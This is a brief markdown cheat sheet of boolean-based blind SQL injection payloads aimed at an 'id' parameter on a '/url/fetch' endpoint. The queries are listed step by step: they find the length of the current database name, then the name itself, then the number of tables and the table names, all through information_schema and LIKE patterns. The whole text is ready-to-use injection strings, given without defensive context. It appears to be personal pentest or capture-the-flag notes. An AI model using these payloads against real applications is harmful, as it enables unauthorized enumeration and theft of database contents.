# Manual Enumeration
## Length of current DB name in use
`/url/fetch?id=1 AND LENGTH(database())=6`
## Name of DB
`/url/fetch?id=1 AND database() LIKE '______'`
## Tables count in db
` /url/fetch?id=1 AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=2`
## Table1 name length
`/url/fetch?id=1 AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)=6`
## Query to get name
`GET /url/fetch?id=1 AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1) LIKE '______'`
